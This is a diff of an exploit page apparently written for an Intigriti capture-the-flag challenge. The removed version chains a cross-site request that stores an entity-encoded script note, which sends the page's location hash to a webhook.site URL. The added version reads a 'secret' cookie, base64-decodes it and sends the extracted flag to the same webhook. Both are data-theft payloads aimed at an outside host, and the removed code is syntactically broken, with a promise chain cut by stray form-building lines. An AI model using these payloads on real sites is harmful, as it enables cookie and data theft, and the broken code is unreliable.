@@ -1,32 +1,6 @@
-<body>
-    <script>
-      // Step 1: Create the note via POST with JSON
-      fetch('https://challenge-0325.intigriti.io/api/post', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          title: 'Leaky Flag',
-          content: '&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;fetch("https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=" + encodeURIComponent(document.location.hash))&#x3C;/script&#x3E;',
-          use_password: 'false'
-        }),
-        credentials: 'include', // Include session cookies
-        mode: 'no-cors' // Bypass CORS errors (opaque response)
-        
-
-      })
-                const input = document.createElement('input');
-      input.name = `_${payload.replace(/"/g, '\\"')}`; // Trick JSON parsing
-      form.appendChild(input);
-
-      document.body.appendChild(form);
-      form.submit();
-      .then(() => {
-        // Step 2: Redirect to /notes to trigger the XSS
-        window.location.href = 'https://challenge-0325.intigriti.io/notes';
-      })
-      .catch(err => console.error('Error:', err));
-    </script>
-  </body>
-</html>
+<script>
+  const cookie = document.cookie.match(/secret=([^;]+)/)[1];
+  const decoded = atob(cookie);
+  const flag = decoded.split(':')[1];
+  fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag='+encodeURIComponent(flag));
+</script>
